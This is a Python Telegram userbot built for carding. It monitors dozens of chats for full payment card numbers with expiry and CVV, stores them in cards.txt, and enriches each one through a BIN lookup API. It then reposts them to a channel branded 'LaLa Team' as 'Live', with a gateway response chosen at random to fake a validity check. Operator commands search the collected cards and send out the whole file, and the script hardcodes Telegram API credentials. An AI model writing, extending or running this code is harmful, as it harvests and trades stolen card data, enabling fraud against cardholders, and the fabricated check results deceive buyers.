import telethon
import asyncio
import os, sys
import re
import requests
from telethon import TelegramClient, events
from random_address import real_random_address
import names
from datetime import datetime
import random


from defs import getUrl, getcards, phone
API_ID = 23840206
API_HASH = '7a6b7bd93ac70f8010ef0aa3e565b5f9'
SEND_CHAT = -1001903652175

client = TelegramClient('session', API_ID, API_HASH)
ccs = []

chats  = [
    -1001964151775,
    -1001507818302,
    -1001738669918,
    -1001601838491,
    -1001738669918,
    -1001494650944,
    -1001662786975,
    -1001505241286,
    -1001394924627,
    -1001718470703,
    -1001308137657,
    -1001332955146,
    -1001601838491,
    -1001852459380,
    -1001928513690,
    -1001709038803,
    -1001870528182,
    -1001840733158,
    -1001319643429,
    -1001695237496,
    -1001150051137,
    -1001605321928,
    -1001637892109,
    -1001896622173,
    -1001883856033,
    -1001821890401,
    -1001668693502,
    -1001478292022,
    -1001610936176,
    -1001648062820,
    -1001582726711,
    -1001319592804,
    -1001296359075,
    -1001770108987,
    -1001740340635,
    -1001378710065,
    -1001975514061,
    -1001218056496,
    -1001425950721,
    -1001697865927,
    -1001461193381,
    -1001630564298,
    -1001613214210,
    -1001619355694,
    -1001523033180,
    -1001861456351,
    -1001806736272,
    -1001350899173,
    -1001861900414,
    -1001883137786,
    -1001308865865,
    -1001559825481,
    -1001953251260,
    -1001764012918,
    -1001580069484,
    -1001446252611,
    -1001292155452,
    -1001761978016,
    -1001552522647,
    -1001918752351,
    -1001703165074,
    -1001523921510,
    -1001564905478,
    -1001577358727,
    -1001845771035,
    -1001969415652,
    -1001923250817,
    -1001563249106,
    -1001768326985,
    -1001300027599,
    -1001580529156,
    -1001612957050,
    -1001721622573,
    -1001780994534,
    -1001237144776,
    -1001606876289,
    -1001800599678,
    -1001522455379,
    -1001914968790,
    -1001738599380,
    -1001878422027,
    -1001860488592,
    -1001408297452,
    -1001671476693,
    -1001803341227,
    -1001901168507,
    -1001202444388,
    -1001973207680,
    -1001918014850,
    -1001840164329,
    -1001977852402,
    -1001969466721,
    -1001826835778,
    -1001692680982,
    -1001922262973,
    -1001897718223,

]

with open('cards.txt', 'r') as r:
    temp_cards = r.read().splitlines()


for x in temp_cards:
    car = getcards(x)
    if car:
        ccs.append(car[0])
    else:
        continue

@client.on(events.NewMessage(chats=chats, func = lambda x: getattr(x, 'text')))
async def my_event_handler(m):
    if m.reply_markup:
        text = m.reply_markup.stringify()
        urls = getUrl(text)
        if not urls:
            return
        text = requests.get(urls[0]).text
    else:
        text = m.text
    cards = getcards(text)
    if not cards:
        return
    cc,mes,ano,cvv = cards
    if cc in ccs:
        return
    ccs.append(cc)
    bin = requests.get(f'https://alexachkbot.alwaysdata.net/apibins.php?bin={cc[:6]}')
    if not bin:
        return
    bin_json =  bin.json()
    #brand = bin['brand']
    #type = bin['type']
    #level = bin['level']
    #bank = bin['bank']
    palabras_clave = ['2010 Card Issuer Declined CVV', 'AVS check failed!', 'Approved (1000)', 'incorrect_cvc', 'Authorization error: CVV_FAILURE', 'Gateway Rejected: cvv', 'Already Added / EXISTING_ACCOUNT_RESTRICTED.', 'succeeded', '2010: Card Issuer Declined CVV (N7)', 'CVC Declined', 'Card Approved CCN/CCV Live', 'Card Issuer Declined CVV', 'Approved CCN']
    # Selecciona una palabra clave aleatoria
    palabra_aleatoria = random.choice(palabras_clave)
    #Aplica formato de cursiva utilizando asteriscos
    palabra_aleatoria_cursiva = f'*{palabra_aleatoria}*'
    fullinfo = f"{cc}|{mes}|{ano}|{cvv}"
    text = f"""__ LaLa Team V2.1 | #bin{cc[:6]} __
    
**CC ⌁** `{cc}|{mes}|{ano}|{cvv}`
**Ex ⌁** `{cc[:12]}xxxx|{mes}|{ano}|
**Status ⌁** __ Live ✅ __
**Resp ⌁** __ {palabra_aleatoria} __
**BinInfo ⌁** [`{bin_json["flag"]}`] **| {bin_json["bank_name"]} - {bin_json["level"]} - {bin_json["type"]} - {bin_json["brand"]}**
**ExtraInf ⌁** **[{bin_json["bank_site"]}**] **- {bin_json["bank_phone"]} 💱 {bin_json["currency"]}**


"""    
    print(f'{cc}|{mes}|{ano}|{cvv}')
    with open('cards.txt', 'a') as w:
        w.write(fullinfo + '\n')
    await client.send_message(SEND_CHAT, text, link_preview = False)




@client.on(events.NewMessage(outgoing = True, pattern = re.compile(r'[./!]extrap( (.*))')))
async def my_event_handler(m):
    text = m.pattern_match.group(1).strip()
    with open('cards.txt', 'r') as r:
        cards = r.read().splitlines() # list of cards
    if not cards:
        return await m.reply("Not Found")
    r = re.compile(f"{text}*.")
    if not r:
        return await m.reply("Not Found")
    newlist = list(filter(r.match, cards)) # Read Note below
    if not newlist:
        return await m.reply("Not Found")
    if len(newlist) == 0:
        return await m.reply("0 Cards found")
    cards = "\n".join(newlist)
    return await m.reply(cards)


@client.on(events.NewMessage(outgoing = True, pattern = re.compile(r'[./!]lives')))
async def my_event_handler(m):
    # emt = await client.get_entity(1582775844)
    # print(telethon.utils.get_input_channel(emt))
    # print(telethon.utils.resolve_id(emt))
    await m.reply(file = 'cards.txt')



client.start()
client.run_until_disconnected()
